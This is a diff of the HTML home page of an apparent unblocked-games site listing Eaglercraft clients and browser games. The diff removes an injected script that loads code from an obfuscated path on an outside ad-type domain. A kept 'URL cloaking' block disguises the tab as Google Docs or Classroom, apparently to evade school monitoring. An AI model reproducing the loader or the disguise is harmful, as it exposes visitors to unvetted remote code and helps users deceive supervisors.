@@ -2,23 +2,12 @@
 <html lang="en">
 
 <head>
+    <meta charset="UTF-8" />
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <link rel="stylesheet" href="index.css">
     <title>Kyle Media Groups</title>
-    <script>
-        (function(wnkpc){
-        var d = document,
-            s = d.createElement('script'),
-            l = d.scripts[d.scripts.length - 1];
-        s.settings = wnkpc || {};
-        s.src = "\/\/pushyconsequence.com\/bNXDVis.d\/Gtlr0OYTWMcw\/BeKmx9JuMZmUHlgkaPvTZUG3LMvTugYx\/MYzSMUtMNNTGcTxhO_D\/ESzSNcAl";
-        s.async = true;
-        s.referrerPolicy = 'no-referrer-when-downgrade';
-        l.parentNode.insertBefore(s, l);
-        })({})
-    </script>
     <!-- URL CLOAKING -->
     <script>
         // Array of objects containing favicons and titles
@@ -28,27 +17,23 @@
             { favicon: 'https://thebombgamer.github.io/img/favicon3.ico', title: 'Google  Docs' },
             { favicon: 'https://thebombgamer.github.io/img/favicon4.ico', title: 'Google Classroom' }
         ];
-
         // Function to set random favicon and title
         function setRandomFaviconAndTitle() {
             // Randomly select an item
             const randomItem = items[Math.floor(Math.random() * items.length)];
-
             // Set the favicon
             const link = document.createElement('link');
             link.rel = 'icon';
             link.href = randomItem.favicon;
             document.head.appendChild(link);
-
             // Set the title
             document.title = randomItem.title;
         }
-
         // Call the function on page load
         window.onload = setRandomFaviconAndTitle;
     </script>
     <!-- END URL CLOAKING -->
-    <meta charset="UTF-8" />
+
     <!-- Google tag (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-GCZE5JC1NR"></script>
     <script>
@@ -76,16 +61,19 @@
                 <div class="ct-1">
                     <h1>Popular Games</h1>
                 </div>
-                <div class="gc-1-container"></div>
+                <div class="gc-1-container">
+
+                </div>
             </div>
             <div class="vd-1">
                 <div class="ct-1">
-                    <h1>Minecraft Eagler</h1>
+                    <h1>Minecraft Eaglercraft Launchers/Clients</h1>
                     <h3 style="text-align: right;"><a href="/mc/">See More ➡️</a></h3>
                 </div>
                 <div class="gc-1-container">
                     <a>
-                        <div class="gc-1"><p class="gt-1">Starlike Client</p>
+                        <div class="gc-1">
+                            <p class="gt-1">Starlike Client</p>
                             <img src="/img/06dd7a4d-c8f6-409d-bd03-4acc97847302.webp" class="cover">
 
                         </div>
@@ -98,7 +86,7 @@
                     </a>
                     <a href="/mc/1.8.8/">
                         <div class="gc-1">
-                            <p class="gt-1">1.8.8 Eaglercraft Client</p>
+                            <p class="gt-1">1.8.8 Eaglercraft</p>
                             <img src="/img/eaglercraft.png" class="cover">
                         </div>
                     </a>
@@ -120,29 +108,40 @@
                 <div class="ct-1">
                     <h1>Other Games</h1>
                     <h3 style="text-align: right;"><a href="/Games/">See More ➡️</a></h3>
-                    <a href="/">
-                        <img class="gc-1" src="/img/2048.png">
-                    </a>
-                    <a href="/Games/misc/slope/index.html">
-                        <img src="/img/slope.png" class="gc-1">
-                    </a>
-                    <a href="/Games/C/chess/">
-                        <img src="/img/chess.png" class="gc-1">
-                    </a>
-                    <a href="/Games/R/run3/">
-                        <img src="/img/run3.png" class="gc-1">
-                    </a>
+                    <div class="gc-1-container">
+                        <a href="/misc/2048/">
+                            <img class="gc-1" src="/img/2048.png">
+                        </a>
+                        <a href="/Games/misc/slope/index.html">
+                            <img src="/img/slope.png" class="gc-1">
+                        </a>
+                        <a href="/Games/C/chess/">
+                            <img src="/img/chess.png" class="gc-1">
+                        </a>
+                        <a href="/misc/worldshardestgame/">
+                            <div class="gc-1">
+                                <p class="gt-1">World's Hardest Game</p>
+                                <img src="/img/whg.png">
+                            </div>
+                        </a>
+                        <a href="/Games/C/cookieclicker/">
+                            <div class="gc-1">
+                                <p class="gt-1">Cookie Clicker</p>
+                                <img src="/img/cookieclicker.png" class="cover">
+                            </div>
+                        </a>
+                    </div>
                 </div>
             </div>
         </div>
     </main>
     <footer>
-        <p>Made By: Kyle Speight | Find my linktree<a href="https://linktr.ee/kylespeight"><button class="b-1">Here</button></a></p>
+        <p>Made By: Kyle Speight & Space4Life | Find my linktree<a href="https://linktr.ee/kylespeight"><button
+                    class="b-1">Here</button></a></p>
     </footer>
     <button class="floating-button" id="toggleCloakingButton" onclick="toggleCloaking()">Toggle Cloaking: On</button>
     <script>
         let cloakingEnabled = true; // Flag to track cloaking status
-
         function toggleCloaking() {
             cloakingEnabled = !cloakingEnabled; // Toggle the flag
             const button = document.getElementById('toggleCloakingButton');
